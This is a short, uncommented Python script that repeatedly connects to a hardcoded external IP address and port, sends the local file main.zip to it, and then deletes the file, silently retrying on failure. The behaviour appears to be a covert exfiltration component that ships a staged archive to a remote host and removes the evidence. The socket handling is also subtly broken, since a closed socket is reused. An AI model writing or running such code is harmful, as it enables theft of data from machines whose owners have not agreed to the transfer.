import os
import socket

ip = "202.191.56.104"
port = 5518
buffer_size = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        s.connect((ip, port))
        print("Connected to server: ")
    except:
        continue
    if not os.path.exists("main.zip"):
        s.close()
        continue
    with open("main.zip", "rb") as f:
        while True:
            data = f.read(buffer_size)
            if not data:
                break
            s.sendall(data)
    os.remove("main.zip")
    s.close()
